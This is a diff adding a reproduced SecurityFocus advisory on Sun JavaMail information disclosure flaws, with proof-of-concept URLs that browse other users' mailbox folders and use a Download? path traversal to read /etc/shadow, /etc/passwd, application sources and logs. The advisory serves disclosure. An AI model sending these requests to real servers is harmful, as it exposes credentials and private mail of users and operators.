@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/13753/info
+
+Sun JavaMail is prone to multiple information disclosure vulnerabilities. The issues exist due to a lack of sufficient input sanitization performed on user-supplied requests. The following issues are reported:
+
+A remote attacker may reveal the contents of email attachments of other users.
+
+A remote attacker may download and peruse arbitrary files with the privileges of the affected service.
+
+A remote attacker may exploit these issues to disclose potentially sensitive information that could be used to aid in further attacks. 
+
+First issue:
+http://example.com/mailboxesdir/user2@example.com/
+http://example.com/mailboxesdir/user3@example.com/
+
+Second issue:
+http://example.com/Download?/var/serviceprovider/web/WEB-INF/web.xml
+http://example.com/Download?/var/serviceprovider/web/login.jsp
+http://example.com/Download?/var/serviceprovider/web/messagecontent.jsp
+http://example.com/Download?/var/serviceprovider/web/addbook.jsp
+http://example.com/Download?/var/serviceprovider/web/compose.jsp
+http://example.com/Download?/var/serviceprovider/web/folder.jsp
+http://example.com/Download?/etc/passwd
+http://example.com/Download?/etc/shadow
+http://example.com/Download?/etc/group
+http://example.com/Download?/var/log/boot.log
+http://example.com/Download?/var/log/maillog 
